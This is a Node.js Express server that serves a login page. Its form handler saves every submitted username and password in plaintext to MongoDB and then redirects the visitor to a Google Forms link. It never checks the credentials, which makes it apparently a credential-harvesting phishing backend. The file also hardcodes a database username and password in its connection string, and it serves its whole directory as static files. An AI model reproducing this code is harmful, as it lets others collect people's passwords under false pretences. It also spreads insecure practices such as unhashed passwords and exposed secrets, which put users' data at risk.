const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const https = require('https');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// MongoDB connection
mongoose.connect('mongodb+srv://missari:missari123@cluster0.2uqs2.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
})
.then(() => console.log('Connected to MongoDB'))
.catch((error) => console.error('MongoDB connection error:', error));

// Define User schema
const userSchema = new mongoose.Schema({
  username: String,
  password: String,
});

const User = mongoose.model('User', userSchema);

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname)); // Serve static files from the root directory

// Serve index.html as the homepage
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

// Serve login.html when accessing /login route
app.get('/submit-form', (req, res) => {
  res.sendFile(__dirname + '/login.html');
});

// POST endpoint to handle login form submission
app.post('/submit-form', async (req, res) => {
  const { username, password } = req.body;

  // Validation for empty username or password
  if (!username || !password) {
    res.status(400).send('<h3 style="color: red;">Invalid username or password. Please try again.</h3>');
    return;
  }

  try {
    // Save user data to MongoDB
    const newUser = new User({ username, password });
    await newUser.save();

    // Redirect on success
    res.redirect('https://forms.gle/pzCXhatTGPDQ8EX68');
  } catch (error) {
    console.error('Error saving data to MongoDB:', error);
    res.status(500).send('<h3 style="color: red;">Server error. Please try again later.</h3>');
  }
});

// Update the paths to point to the ssl folder in the same directory as server.js
const options = {
  key: fs.readFileSync(path.join(__dirname, 'ssl', 'private.key')),  // Path to private key in ssl folder
  cert: fs.readFileSync(path.join(__dirname, 'ssl', 'certificate.crt')), // Path to certificate in ssl folder
};

// Start the HTTPS server
https.createServer(options, app).listen(PORT, () => {
  console.log(`Server is running securely on https://localhost:${PORT}`);
});
